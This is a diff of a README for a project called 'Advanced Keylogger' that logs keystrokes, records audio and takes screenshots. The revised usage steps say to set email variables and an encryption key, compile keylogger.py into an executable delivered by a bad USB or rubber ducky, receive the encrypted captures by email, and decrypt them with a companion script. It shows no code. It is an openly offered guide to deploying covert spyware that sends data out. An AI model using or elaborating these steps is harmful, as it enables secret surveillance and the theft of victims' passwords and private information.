@@ -6,12 +6,17 @@ Advanced Keylogger: register keypresses, record audio, take screenshots AUTOMATI
 
 ### How To  Use:
 
-1-Change Email variables
+1-Change Email variables 
 
-2-Change Timers and Tickrate
+2-Change cryptography key
 
-3-Compile it into EXE (setup a bad USB or rubber ducky)
+3-Change Timers and Tickrate
 
+4-Compile keylogger.py into EXE (setup a bad USB or rubber ducky)
+
+5-Receive encrypted files trough email
+
+6-Decrypt using decrypt.py
 
 ### Functionalities:
   -Keylogging
